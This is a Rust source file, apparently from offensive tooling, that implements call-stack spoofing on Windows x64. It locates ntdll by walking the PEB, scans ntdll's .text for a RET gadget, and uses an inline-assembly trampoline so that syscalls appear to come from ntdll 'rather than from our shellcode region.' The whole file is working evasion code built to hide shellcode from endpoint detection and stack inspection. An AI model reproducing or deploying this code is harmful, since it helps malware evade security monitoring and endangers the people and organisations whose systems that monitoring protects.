//! spoof.rs — Return address / call stack spoofing
//!
//! Implements a trampoline-based stack spoof so that syscall-intensive
//! operations appear to originate from a benign call site (e.g. ntdll
//! itself) rather than from our shellcode region.
//!
//! spoof_stack(target_fn, args)  — call target with a spoofed return address
//! init_gadget()                 — find a `ret` gadget in ntdll .text

#![allow(dead_code, non_snake_case)]

use std::arch::global_asm;

// ── Gadget address (set once at startup) ─────────────────────────────────────

#[no_mangle]
pub static mut G_GADGET_ADDR: usize = 0;

pub unsafe fn init_gadget() {
    if let Some(addr) = find_ret_gadget() {
        G_GADGET_ADDR = addr;
    }
}

// ── Gadget scanner ─────────────────────────────────────────────────────────

unsafe fn find_ret_gadget() -> Option<usize> {
    // Walk PEB → ntdll (second entry in InMemoryOrderModuleList)
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8); // head
    e = *(e as *const *const u8);                     // [0] exe
    e = *(e as *const *const u8);                     // [1] ntdll
    let base = *(e.add(0x30) as *const *const u8) as *const u8;

    // Parse PE to find .text
    let pe_off   = *(base.add(0x3C) as *const u32) as usize;
    let nt       = base.add(pe_off);
    let num_sec  = *(nt.add(0x06) as *const u16) as usize;
    let opt_size = *(nt.add(0x14) as *const u16) as usize;
    let sec_base = nt.add(0x18 + opt_size);

    for i in 0..num_sec {
        let sec = sec_base.add(i * 0x28);
        let name = core::slice::from_raw_parts(sec, 8);
        if &name[..5] != b".text" { continue; }
        let virt_addr = *(sec.add(0x0C) as *const u32) as usize;
        let virt_size = *(sec.add(0x08) as *const u32) as usize;
        let text_start = base.add(virt_addr);
        // Find a C3 (RET) at least 4 bytes into the section
        for off in 4..virt_size.saturating_sub(1) {
            if *text_start.add(off) == 0xC3 {
                return Some(text_start.add(off) as usize);
            }
        }
    }
    None
}

// ── Spoof trampoline ────────────────────────────────────────────────────────────
//
// Calling convention when spoof_gate is entered via `call spoof_gate`:
//
//   RSP+0x00  = return address back to spoof_stack (pushed by `call`)
//   R10       = target function pointer (passed by spoof_stack)
//   RCX/RDX/R8/R9 = args 0-3 (set by spoof_stack before the call)
//
// What spoof_gate does:
//   1. Save real return address from [RSP] into RAX
//   2. Load gadget addr
//   3. Replace [RSP+0] with gadget addr  → target’s `ret` lands in ntdll
//   4. Push real return addr below that   → gadget’s `ret` comes back to us
//   5. Jump to target
//
// Stack on entry to target_fn:
//   RSP+0x00  = gadget addr   (target’s fake return address)
//   RSP+0x08  = real ret addr (gadget jumps here after its ret)
//
// Net result: target sees a clean ntdll return address in the call stack.

global_asm!(
    ".globl spoof_gate",
    "spoof_gate:",
    // RAX = real return address (currently at [RSP])
    "    mov  rax, [rsp]",
    // Load gadget address into R11
    "    lea  r11, [rip + G_GADGET_ADDR]",
    "    mov  r11, [r11]",
    // Overwrite [RSP] with gadget addr so target's ret goes there
    "    mov  [rsp], r11",
    // Push real return addr below (gadget's subsequent ret comes back here)
    "    push rax",
    // Jump to target (args already in rcx/rdx/r8/r9)
    "    jmp  r10",
);

extern "C" {
    fn spoof_gate();
}

/// Call `target` with args arg0..arg3 but with a spoofed return address.
/// The call stack seen by `target` will show a `ret` gadget inside ntdll
/// rather than our code.
///
/// # Safety
/// `init_gadget()` must have been called first. If G_GADGET_ADDR == 0
/// the call is made directly (no spoof) as a safe fallback.
pub unsafe fn spoof_stack(
    target: unsafe extern "system" fn() -> isize,
    arg0: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
) -> isize {
    if G_GADGET_ADDR == 0 {
        // Fallback: direct call, no stack spoof
        return core::mem::transmute::<
            unsafe extern "system" fn() -> isize,
            unsafe extern "system" fn(usize, usize, usize, usize) -> isize,
        >(target)(arg0, arg1, arg2, arg3);
    }

    // Set up args in the correct registers and pass target in R10,
    // then call spoof_gate which will fix the return address.
    let result: isize;
    core::arch::asm!(
        "mov  rcx, {a0}",
        "mov  rdx, {a1}",
        "mov  r8,  {a2}",
        "mov  r9,  {a3}",
        "mov  r10, {tgt}",
        "call {gate}",
        a0   = in(reg) arg0,
        a1   = in(reg) arg1,
        a2   = in(reg) arg2,
        a3   = in(reg) arg3,
        tgt  = in(reg) target as usize,
        gate = sym spoof_gate,
        lateout("rax") result,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _,
        // No explicit stack manipulation here — spoof_gate handles it
    );
    result
}
